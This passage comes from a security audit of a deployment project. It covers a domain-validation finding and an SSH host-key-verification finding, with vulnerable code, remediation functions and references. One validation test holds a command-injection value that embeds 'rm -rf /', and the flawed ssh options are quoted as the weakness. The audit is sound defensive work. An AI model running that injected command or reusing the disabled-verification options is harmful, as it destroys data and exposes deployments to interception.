    log_error "Invalid DOMAIN configuration"
    log_error "Set DOMAIN environment variable to a valid public domain"
    log_error "Example: export DOMAIN=monitoring.example.com"
    exit 1
fi
```

**Testing:**
```bash
# Test validation
export DOMAIN="localhost"
# Should fail: "Domain appears to be internal/localhost"

export DOMAIN="test.com; rm -rf /"
# Should fail: "Invalid domain format"

export DOMAIN="192.168.1.100"
# Should fail: "Domain cannot be an IP address"

export DOMAIN="monitoring.example.com"
# Should pass (if DNS configured correctly)
```

**References:**
- CWE-20: Improper Input Validation
- OWASP SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- RFC 1035: Domain Names

---

### VULN-010: SSH Host Key Verification Disabled (CWE-295)

**CVSS 3.1 Score:** 7.4 (HIGH)
**OWASP Category:** A07:2021 - Identification and Authentication Failures

**Affected Files:**
- `/home/calounx/repositories/mentat/chom/deploy/deploy.sh` (Lines 84, 97, 110)
- `/home/calounx/repositories/mentat/chom/deploy/deploy-enhanced.sh` (Lines 962, 1038)

**Vulnerable Code:**
```bash
# Host key verification completely disabled
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -i "$key_path" "$DEPLOY_USER@$target_ip" "$@"

scp -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -i "$key_path" "$@"
```

**Security Impact:**
- **Man-in-the-Middle Attacks:** Cannot detect server impersonation
- **Credential Theft:** SSH keys sent to wrong server
- **Data Interception:** All traffic can be intercepted
- **Violates SSH Security Model:** Defeats purpose of SSH

**Attack Scenario:**
```
[Attacker] <-> [MITM Proxy] <-> [Real Server]
     ^              |
     |              └─> Intercepts SSH traffic
     |                  Steals credentials
     |                  Modifies deployments
     └─ Client connects without verification
```

**Remediation:**
```bash
# SECURE SSH IMPLEMENTATION

SSH_KNOWN_HOSTS="${SSH_KNOWN_HOSTS:-$HOME/.ssh/known_hosts}"
SSH_KNOWN_HOSTS_DIR="$(dirname "$SSH_KNOWN_HOSTS")"

# Initialize SSH configuration
init_ssh_config() {
    # Create .ssh directory if needed
    if [[ ! -d "$SSH_KNOWN_HOSTS_DIR" ]]; then
        mkdir -p "$SSH_KNOWN_HOSTS_DIR"
        chmod 700 "$SSH_KNOWN_HOSTS_DIR"
    fi

    # Create known_hosts if needed
    if [[ ! -f "$SSH_KNOWN_HOSTS" ]]; then
        touch "$SSH_KNOWN_HOSTS"
        chmod 600 "$SSH_KNOWN_HOSTS"
    fi
}

# Add host key with verification
add_ssh_host_key() {
    local target_ip="$1"

    log_info "========================================="
    log_info "  SSH Host Key Verification"
    log_info "========================================="
    log_info ""
    log_info "Adding SSH host key for ${target_ip}"
    log_warn "IMPORTANT: Verify the fingerprint matches your server!"
    log_info ""

    # Get host key
    log_info "Fetching host key..."
    local host_key=$(ssh-keyscan -H "$target_ip" 2>/dev/null)

    if [[ -z "$host_key" ]]; then
        log_error "Failed to fetch host key from ${target_ip}"
        log_error "Ensure SSH is running on the target server"
        return 1
    fi

    # Display fingerprints for verification
    log_info "Host key fingerprints for ${target_ip}:"
    echo ""
    ssh-keygen -lf <(echo "$host_key") | while read -r line; do
        echo "  $line"
    done
    echo ""

    log_warn "Verify these fingerprints match your server!"
    log_warn "Compare with: ssh-keygen -lf /etc/ssh/ssh_host_*_key.pub"
    echo ""

    read -p "Do these fingerprints match your server? (yes/no): " confirm

    if [[ "$confirm" != "yes" ]]; then
        log_error "Host key not confirmed. Aborting."
        log_error "This prevents man-in-the-middle attacks."
        return 1
    fi

    # Add to known_hosts
    echo "$host_key" >> "$SSH_KNOWN_HOSTS"
    log_success "Host key added to ${SSH_KNOWN_HOSTS}"

    return 0
}

# Check if host key exists
has_host_key() {
    local target_ip="$1"

    if ssh-keygen -F "$target_ip" -f "$SSH_KNOWN_HOSTS" >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Secure SSH connection
ssh_deploy() {
    local target_ip="$1"
    shift  # Remaining args are SSH command

    init_ssh_config

    # Check if host key exists
    if ! has_host_key "$target_ip"; then
        log_info "No host key found for ${target_ip}"
        if ! add_ssh_host_key "$target_ip"; then
            return 1
        fi
    fi

    # Connect with strict checking ENABLED
    ssh -o StrictHostKeyChecking=yes \
        -o UserKnownHostsFile="$SSH_KNOWN_HOSTS" \
        -o PasswordAuthentication=no \
        -i "$key_path" \
        "$DEPLOY_USER@$target_ip" \
        "$@"
}

# Secure SCP
scp_deploy() {
    local target_ip="$1"
    shift  # Remaining args are SCP arguments

    init_ssh_config

    # Check if host key exists
    if ! has_host_key "$target_ip"; then
        if ! add_ssh_host_key "$target_ip"; then
            return 1
        fi
    fi

    # Use strict checking
    scp -o StrictHostKeyChecking=yes \
        -o UserKnownHostsFile="$SSH_KNOWN_HOSTS" \
        -o PasswordAuthentication=no \
        -i "$key_path" \
        "$@"
}

# Handle host key changes (MITM or legitimate server reinstall)
update_host_key() {
    local target_ip="$1"

    log_warn "========================================="
    log_warn "  SSH HOST KEY HAS CHANGED"
    log_warn "========================================="
    log_warn ""
    log_warn "The SSH host key for ${target_ip} has changed."
    log_warn "This could indicate:"
    log_warn "  1. Server was reinstalled (legitimate)"
    log_warn "  2. Man-in-the-middle attack (DANGER)"
    log_warn ""
    log_warn "If you did NOT reinstall the server, STOP NOW."
    log_warn ""

    read -p "Did you recently reinstall this server? (yes/no): " confirm

    if [[ "$confirm" != "yes" ]]; then
        log_error "Host key change not confirmed. Aborting for security."
        return 1
    fi

    # Remove old key
    ssh-keygen -R "$target_ip" -f "$SSH_KNOWN_HOSTS"

    # Add new key
    add_ssh_host_key "$target_ip"
}
```

**Usage Example:**
```bash
# First connection: prompts for key verification
ssh_deploy "10.10.100.20" "ls -la"

# Subsequent connections: uses stored key
ssh_deploy "10.10.100.20" "uptime"

# If key changes: prompts for confirmation
ssh_deploy "10.10.100.20" "ls"
# WARNING: SSH HOST KEY HAS CHANGED
```

**References:**
- CWE-295: Improper Certificate Validation
- SSH Best Practices: https://www.ssh.com/academy/ssh/config
- SSH Key Fingerprint Verification

---

*[Continued in next section due to length...]*

